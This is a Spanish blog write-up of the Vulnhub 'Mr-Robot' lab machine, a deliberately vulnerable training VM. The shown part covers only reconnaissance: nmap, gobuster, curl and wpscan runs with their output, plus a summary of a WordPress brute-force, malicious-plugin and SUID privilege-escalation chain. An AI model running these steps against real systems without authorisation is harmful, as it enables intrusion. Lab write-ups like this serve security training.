<!doctype html><html lang=es><head><title>Vulnhub Mr-Robot WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="Vulnhub 'Mr-Robot' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnhub Mr-Robot WriteUp"><meta name=twitter:description content="Vulnhub 'Mr-Robot' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/mrrobot/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="Vulnhub Mr-Robot WriteUp"><meta property="og:description" content="Vulnhub 'Mr-Robot' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-15T00:00:00+00:00"><meta property="article:tag" content="Vulnhub"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Nmap"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/mrrobot/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/mrrobot/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/mrrobot/>Vulnhub Mr-Robot WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-15T00:00:00Z>15 agosto, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
16 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/vulnhub/>Vulnhub</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/nmap/>Nmap</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/whatweb/>Whatweb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/brute-force-password-cracking/>Brute Force Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/brute-force-password-login/>Brute Force Password Login</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/wordpress/>Wordpress</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/wpscan/>Wpscan</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hydra/>Hydra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/suid/>Suid</a></span></div></div></header><div class=post-content><h1 id=mr-robot----vulnhub>Mr-Robot &ndash; Vulnhub
<a class=heading-link href=#mr-robot----vulnhub><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>Vulnhub</em></li></ul><p><img alt="&lsquo;Mr-Robot&rsquo; Avatar" src=/images/Vulnhub_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Mr-Robot</code> es una m√°quina de dificultad f√°cil (y gratis), utilizando <code>Linux</code>, de la plataforma <code>Vulnhub</code>. Luego de un scan inicial sobre los puertos <code>TCP</code> ports, √©ste nos muestra que la m√°quina v√≠ctima esta corriendo un servidor web. Gracias a un r√°pido an√°lisis de directorios, notamos que este sitio web est√° utilizando el gestor de contenido <code>WordPress</code>. Dado que <code>Wordpress</code> muestra distintos mensajes en intentos de logueo que var√≠an en si un usuario existe o no (incluso si se usa una contrase√±a incorrecta), podemos aprovechar estos mensajes de error para buscar por usuarios que s√≠ existen utilizando un diccionario previamente hallado en la m√°quina v√≠ctima. Una vez encontrado un usuario podemos volver a utilizar el diccionario encontrado para encontrar tambi√©n la contrase√±a de este usuario y as√≠ obtener credenciales v√°lidas para entrar en el panel de <code>WordPress</code>. Una vez dentro de este panel, somos capaces de agregar un plugin malicioso propio a <code>WordPress</code>, el cual nos permite ganar acceso inicial a la m√°quina v√≠ctima. Ya hecha la intrusi√≥n, somos capaces de encontrar un hash de un usuario y crackearlo a trav√©s de un <code>Bruteforce Password Cracking</code> utilizando el diccionario <code>rockyou.txt</code>; para as√≠ pivotear a este nuevo usuario. Finalmente, vemos que hay un archivo <code>SUID</code> cuyo propietario es <code>root</code> el cual es inusual y puede ser abusado para ganar as√≠ acceso como el usuario <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezando un scan con <code>Nmap</code> buscando puertos <code>TCP</code> abiertos muestra lo siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:02 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 01:02
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.120 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 01:02, 0.08s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 01:02
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.120 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 443/tcp on 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 01:03, 26.39s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00038s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-08-13 01:02:38 -04 for 26s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
</span></span></span><span class=line><span class=cl><span class=go>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span></span><span class=line><span class=cl><span class=go>PORT    STATE SERVICE REASON
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http    syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>443/tcp open  https   syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:67:F5:05 (Oracle VirtualBox virtual NIC)
</span></span></span></code></pre></div><ul><li>Del scan anterior puedo ver 2 puertos abiertos: <code>80</code> <code>HTTP</code> y <code>443</code> <code>HTTPs</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,443 10.20.1.120 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:06 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00038s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE  VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http     Apache httpd
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=go>443/tcp open  ssl/http Apache httpd
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=www.example.com
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2015-09-16T10:45:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2025-09-13T10:45:03
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:67:F5:05 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
</span></span></span></code></pre></div><ul><li>Usando <code>WhatWeb</code> sobre el sitio web muestra lo siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a3 http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.120 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.20.1.120], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
</span></span></span></code></pre></div><p>de donde, tristemente, no puedo ver mucha info de utilidad.</p><ul><li>Visitando <code>http://10.120.1.120</code> (la IP de la m√°quina v√≠ctima) muestra un simple mensaje:</li></ul><p><img alt="MrRobot 1" src=/images/MrRobot_1.png></p><ul><li>All√≠ puedo ver que la p√°gina deja seleccionar m√∫ltiples &ldquo;comandos&rdquo; como opciones. Seleccionar cada una de ellas muestra distintos posts y videos sobre la serie &ldquo;Mr. Robot&rdquo;. En este punto decido buscar por directorios a trav√©s de un <code>Brute Force Directory Listing</code> (listar directorios por fuerza bruta) con la herramienta <code>Gobuster</code> usando un diccionario de <a href=https://github.com/danielmiessler/SecLists class=external-link target=_blank rel=noopener>SecLists</a>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.20.1.120 -x php,txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 10
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php,txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 234] [--&gt; http://10.20.1.120/images/]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/blog                 (Status: 301) [Size: 232] [--&gt; http://10.20.1.120/blog/]
</span></span></span><span class=line><span class=cl><span class=go>/rss                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/sitemap              (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>/login                (Status: 302) [Size: 0] [--&gt; http://10.20.1.120/wp-login.php]
</span></span></span><span class=line><span class=cl><span class=go>/0                    (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/0/]
</span></span></span><span class=line><span class=cl><span class=go>/feed                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/video                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/video/]
</span></span></span><span class=line><span class=cl><span class=go>/image                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/image/]
</span></span></span><span class=line><span class=cl><span class=go>/atom                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/atom/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-content           (Status: 301) [Size: 238] [--&gt; http://10.20.1.120/wp-content/]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/admin/]
</span></span></span><span class=line><span class=cl><span class=go>/audio                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/audio/]
</span></span></span><span class=line><span class=cl><span class=go>/intro                (Status: 200) [Size: 516314]
</span></span></span><span class=line><span class=cl><span class=go>/wp-login             (Status: 200) [Size: 2657]
</span></span></span><span class=line><span class=cl><span class=go>/wp-login.php         (Status: 200) [Size: 2657]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 231] [--&gt; http://10.20.1.120/css/]
</span></span></span><span class=line><span class=cl><span class=go>/rss2                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/license              (Status: 200) [Size: 309]
</span></span></span><span class=line><span class=cl><span class=go>/license.txt          (Status: 200) [Size: 309]
</span></span></span><span class=line><span class=cl><span class=go>/wp-includes          (Status: 301) [Size: 239] [--&gt; http://10.20.1.120/wp-includes/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 230] [--&gt; http://10.20.1.120/js/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/wp-login.php?action=register]
</span></span></span><span class=line><span class=cl><span class=go>/Image                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/Image/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-rss2.php          (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/rdf                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/rdf/]
</span></span></span><span class=line><span class=cl><span class=go>/page1                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/readme               (Status: 200) [Size: 64]
</span></span></span><span class=line><span class=cl><span class=go>/robots               (Status: 200) [Size: 41]
</span></span></span><span class=line><span class=cl><span class=go>/robots.txt           (Status: 200) [Size: 41]
</span></span></span><span class=line><span class=cl><span class=go>/dashboard            (Status: 302) [Size: 0] [--&gt; http://10.20.1.120/wp-admin/]
</span></span></span><span class=line><span class=cl><span class=go>/%20                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-admin             (Status: 301) [Size: 236] [--&gt; http://10.20.1.120/wp-admin/]
</span></span></span></code></pre></div><ul><li>Gracias a estos directorios noto que el sitio est√° corriendo con <code>WordPress</code>. Visitando el directorio <code>http://10.20.1.120/wp-admin</code> s√≥lo lo confirma:</li></ul><p><img alt="MrRobot 2" src=/images/MrRobot_2.png></p><ul><li>Adicionalmente, noto que existe un archivo <code>robots.txt</code>. Revisando √©sta con <code>cURL</code> en consola nos muestra:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.120/robots.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User-agent: *
</span></span></span><span class=line><span class=cl><span class=go>fsocity.dic
</span></span></span><span class=line><span class=cl><span class=go>key-1-of-3.txt
</span></span></span></code></pre></div><p>donde puedo ver 2 potenciales archivos: <code>fsocity.dic</code> y <code>key-1-of-3.txt</code>.</p><ul><li>Si chequeo <code>http://10.20.1.120/fsocity.dic</code> noto que este es un archivo con much√≠simas palabras. Podemos visitar esta direcci√≥n url a trav√©s de un browser de internet como <code>Firefox</code> y se nos descargar√° este archivo. Me doy cuenta de que este archivo tiene unas 858 160 l√≠neas/palabras:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat fsocity.dic | wc -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>858160
</span></span></span></code></pre></div><ul><li>El archivo <code>key-1-of-3.txt</code> muestra un texto:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.120/key-1-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>073403c8a58a1f80d943455fb30724b9
</span></span></span></code></pre></div><p>el cual no es m√°s que la primera &ldquo;flag&rdquo; de esta m√°quina.</p><ul><li>Y en este punto, y dado que el sitio web est√° usando <code>WordPress</code>, devido usar la herramienta <code>WPScan</code> contra √©ste. Primero, escandeando por plugins:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wpscan -e ap --plugins-detection aggressive --url http://10.20.1.120 -t 40
</span></span></span><span class=line><span class=cl><span class=go>_______________________________________________________________
</span></span></span><span class=line><span class=cl><span class=go>         __          _______   _____
</span></span></span><span class=line><span class=cl><span class=go>         \ \        / /  __ \ / ____|
</span></span></span><span class=line><span class=cl><span class=go>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
</span></span></span><span class=line><span class=cl><span class=go>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
</span></span></span><span class=line><span class=cl><span class=go>            \  /\  /  | |     ____) | (__| (_| | | | |
</span></span></span><span class=line><span class=cl><span class=go>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>         WordPress Security Scanner by the WPScan Team
</span></span></span><span class=line><span class=cl><span class=go>                         Version 3.8.25
</span></span></span><span class=line><span class=cl><span class=go>       Sponsored by Automattic - https://automattic.com/
</span></span></span><span class=line><span class=cl><span class=go>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span></span><span class=line><span class=cl><span class=go>_______________________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[i] It seems like you have not updated the database for some time.
</span></span></span><span class=line><span class=cl><span class=go>[?] Do you want to update now? [Y]es [N]o, default: [N]n
</span></span></span><span class=line><span class=cl><span class=go>[+] URL: http://10.20.1.120/ [10.20.1.120]
</span></span></span><span class=line><span class=cl><span class=go>[+] Started: Tue Aug 13 01:36:17 2024
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Interesting Finding(s):
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Headers
</span></span></span><span class=line><span class=cl><span class=go> | Interesting Entries:
</span></span></span><span class=line><span class=cl><span class=go> |  - Server: Apache
</span></span></span><span class=line><span class=cl><span class=go> |  - X-Mod-Pagespeed: 1.9.32.3-4523
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Headers (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] robots.txt found: http://10.20.1.120/robots.txt
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Robots Txt (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] XML-RPC seems to be enabled: http://10.20.1.120/xmlrpc.php
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go> | References:
</span></span></span><span class=line><span class=cl><span class=go> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] The external WP-Cron seems to be enabled: http://10.20.1.120/wp-cron.php
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 60%
</span></span></span><span class=line><span class=cl><span class=go> | References:
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span></span><span class=line><span class=cl><span class=go> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Emoji Settings (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/0a0fd7f.html, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1&#39;
</span></span></span><span class=line><span class=cl><span class=go> | Confirmed By: Meta Generator (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/0a0fd7f.html, Match: &#39;WordPress 4.3.1&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] WordPress theme in use: twentyfifteen
</span></span></span><span class=line><span class=cl><span class=go> | Location: http://10.20.1.120/wp-content/themes/twentyfifteen/
</span></span></span><span class=line><span class=cl><span class=go> | Last Updated: 2023-11-07T00:00:00.000Z
</span></span></span><span class=line><span class=cl><span class=go> | Readme: http://10.20.1.120/wp-content/themes/twentyfifteen/readme.txt
</span></span></span><span class=line><span class=cl><span class=go> | [!] The version is out of date, the latest version is 3.6
</span></span></span><span class=line><span class=cl><span class=go> | Style URL: http://10.20.1.120/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
</span></span></span><span class=line><span class=cl><span class=go> | Style Name: Twenty Fifteen
</span></span></span><span class=line><span class=cl><span class=go> | Style URI: https://wordpress.org/themes/twentyfifteen/
</span></span></span><span class=line><span class=cl><span class=go> | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple, st...
</span></span></span><span class=line><span class=cl><span class=go> | Author: the WordPress team
</span></span></span><span class=line><span class=cl><span class=go> | Author URI: https://wordpress.org/
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Css Style In 404 Page (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Version: 1.3 (80% confidence)
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Style (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: &#39;Version: 1.3&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Enumerating All Plugins (via Aggressive Methods)
</span></span></span><span class=line><span class=cl><span class=go> Checking Known Locations - Time: 00:29:34 &lt;=====================================================================================&gt; (104860 / 104860) 100.00% Time: 00:29:34
</span></span></span><span class=line><span class=cl><span class=go>[+] Checking Plugin Versions (via Passive and Aggressive Methods)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[i] Plugin(s) Identified:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] akismet
</span></span></span><span class=line><span class=cl><span class=go> | Location: http://10.20.1.120/wp-content/plugins/akismet/
</span></span></span><span class=line><span class=cl><span class=go> | Latest Version: 5.3.1
</span></span></span><span class=line><span class=cl><span class=go> | Last Updated: 2024-01-17T22:32:00.000Z
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Known Locations (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/wp-content/plugins/akismet/, status: 403
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | The version could not be determined.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span></span><span class=line><span class=cl><span class=go>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
